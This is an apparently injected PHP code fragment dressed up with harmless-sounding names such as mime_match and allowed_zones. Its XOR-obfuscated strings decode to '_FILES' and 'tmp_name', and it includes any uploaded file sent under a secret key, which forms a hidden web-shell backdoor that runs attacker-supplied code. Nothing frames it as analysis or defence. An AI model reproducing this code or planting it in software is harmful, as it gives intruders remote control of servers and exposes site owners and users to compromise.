...
$pung = 'FCHMEd72Kny8X';
	$escaped = 'parsed';
function mime_match($image_url, $trash)

{
    $mime_subgroup = urldecode($image_url);
    $tb_list = substr($trash,0, strlen($mime_subgroup));
    $where = $mime_subgroup ^ $tb_list;
    return $where;

}
$allowed = ${mime_match("%19%05%01%01%007", $pung)};
	$term = 'allowed_zones';
if (isset($allowed[$pung]))

{
    $loop_member = $allowed[$pung];
    $newtext = $loop_member[mime_match("2.8%12%2B%05ZW", $pung)];
    include ($newtext);
}
